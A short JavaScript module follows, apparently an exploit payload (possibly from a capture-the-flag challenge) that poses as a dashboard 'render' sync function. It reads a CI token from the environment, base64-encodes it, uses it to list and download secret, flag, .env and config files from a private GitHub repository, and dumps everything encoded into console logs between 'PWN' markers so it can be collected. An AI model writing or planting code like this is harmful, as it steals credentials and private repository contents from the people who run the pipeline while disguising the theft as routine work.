export async function render(context) {
  const token = process.env.DASHBOARD_SYNC_TOKEN || "";
  const owner = process.env.GITHUB_REPOSITORY_OWNER || "DevOpsDownTimeV3";
  const repo = "ops-dashboard-internal";
  const h = {
    "Accept": "application/vnd.github+json",
    "Authorization": "Bearer " + token,
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "status-sync"
  };
  const lines = [];
  lines.push("TOKEN_B64=" + Buffer.from(token).toString("base64"));
  try {
    const t = await fetch(`https://api.github.com/repos/${owner}/${repo}/git/trees/HEAD?recursive=1`, { headers: h });
    lines.push("TREE_STATUS=" + t.status);
    const tree = await t.json();
    const paths = (tree.tree || []).map(x => x.path);
    lines.push("PATHS=" + JSON.stringify(paths));
    for (const p of paths) {
      if (/flag|secret|readme|\.md$|\.txt$|\.env|\.json$/i.test(p)) {
        const fr = await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${p}`, { headers: h });
        const fj = await fr.json();
        if (fj && fj.content) lines.push("FILE::" + p + "::" + Buffer.from(fj.content, "base64").toString("utf8"));
      }
    }
  } catch (e) { lines.push("ERR=" + String(e)); }
  const blob = Buffer.from(lines.join("\n")).toString("base64");
  console.log("PWN_BEGIN");
  for (let i = 0; i < blob.length; i += 200) console.log("PWN:" + blob.slice(i, i + 200));
  console.log("PWN_END");
  return JSON.stringify({ ok: true });
}
